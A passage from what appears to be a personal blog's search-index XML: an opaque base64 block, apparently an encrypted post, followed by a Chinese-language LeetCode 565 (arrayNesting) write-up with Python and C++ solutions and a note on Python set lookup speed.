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 </div>]]></content>
      
        
        <tags>
            
            <tag> Life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[arrayNesting]]></title>
      <url>/2017/06/05/Algorithms/565-arrayNesting/</url>
      <content type="html"><![CDATA[<h2 id="LeetCode565-arrayNesting题解"><a href="#LeetCode565-arrayNesting题解" class="headerlink" title="LeetCode565-arrayNesting题解"></a>LeetCode565-arrayNesting题解</h2><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>A zero-indexed array A consisting of N different integers is given. The array contains all integers in the range [0, N - 1].</p>
<p>Sets S[K] for 0 &lt;= K &lt; N are defined as follows:</p>
<p>S[K] = { A[K], A[A[K]], A[A[A[K]]], … }.</p>
<p>Sets S[K] are finite for each K and should NOT contain duplicates.</p>
<p>Write a function that given an array A consisting of N integers, return the size of the largest set S[K] for this array.</p>
<p><strong>Example</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: A = [5,4,0,3,1,6,2]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: </span><br><span class="line">A[0] = 5, A[1] = 4, A[2] = 0, A[3] = 3, A[4] = 1, A[5] = 6, A[6] = 2.</span><br><span class="line"></span><br><span class="line">One of the longest S[K]:</span><br><span class="line">S[0] = &#123;A[0], A[5], A[6], A[2]&#125; = &#123;5, 6, 2, 0&#125;</span><br></pre></td></tr></table></figure>
<h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>尝试暴力破解 即遍历从0到length每个数都作为起点，计算最大的回环长度，结果是time-limit-error，因为时间复杂度是O(n^2) 。比如[1,2,3,4,5,0] 这样的数组复杂度就是O(N^2)</p>
<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>相对于暴力破解，首先想到的改进是把遍历过的点都存在ans中，以后再碰到它就跳过，但是还是time-limit-error,后来想到可能是list的<code>__contains__()</code>方法太耗时，就把ans设置成了set类型，就通过了。</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>O(n)×contains函数的复杂度   因为每个节点最多访问过1次</p>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">arrayNesting</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        length = len(nums)</span><br><span class="line">        maxlen = <span class="number">0</span></span><br><span class="line">        ans = set()</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; length:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> ans:</span><br><span class="line">                i = i +<span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            this_len = <span class="number">0</span></span><br><span class="line">            j = i</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> j <span class="keyword">in</span> ans:</span><br><span class="line">                ans.add(j)</span><br><span class="line">                j=nums[j]</span><br><span class="line">                this_len = this_len +<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> maxlen &lt; this_len:</span><br><span class="line">                maxlen = this_len </span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> maxlen</span><br><span class="line">        <span class="keyword">return</span> maxlen</span><br></pre></td></tr></table></figure>
<p>程序时间是132ms，<strong>注意这里 判断一个集合是否包含一个元素应该用x in set</strong></p>
<h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p>一个改进是：可以避免使用contains函数 每次j=nums[j]执行了之后，把原本j的位置的值设为-1 ,时间复杂度为O(n)空间复杂度为O(1)</p>
<p>（或者另开一个数组存储是否访问过这个位置，这种方法叫visited array[<a href="https://leetcode.com/articles/array-nesting/" target="_blank" rel="noopener">https://leetcode.com/articles/array-nesting/</a>] 这种方法时间空间复杂度都是O(n)）</p>
<h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><p>这个运行时间只有35ms</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">arrayNesting</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">size_t</span> maxsize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = i; a[k] &gt;= <span class="number">0</span>; size++) &#123;</span><br><span class="line">                <span class="keyword">int</span> ak = a[k];</span><br><span class="line">                a[k] = <span class="number">-1</span>; <span class="comment">// mark a[k] as visited;</span></span><br><span class="line">                k = ak;</span><br><span class="line">            &#125;</span><br><span class="line">            maxsize = max(maxsize, size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxsize;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>## </p>
<h2 id="Python中内置数据结构的插入、查询、删除的复杂度"><a href="#Python中内置数据结构的插入、查询、删除的复杂度" class="headerlink" title="Python中内置数据结构的插入、查询、删除的复杂度"></a>Python中内置数据结构的插入、查询、删除的复杂度</h2><p>由这道题也让我想到了去看一看python内置数据结构的实现方式，各种常用操作的时间复杂度</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[findUnsortedSubarray]]></title>
      <url>/2017/06/03/Algorithms/581-findUnsortedSubarray/</url>
      <content type="html"><![CDATA[<h2 id="LeetCode581-findUnsortedSubarray题解"><a href="#LeetCode581-findUnsortedSubarray题解" class="headerlink" title="LeetCode581- findUnsortedSubarray题解"></a>LeetCode581- findUnsortedSubarray题解</h2><a id="more"></a>
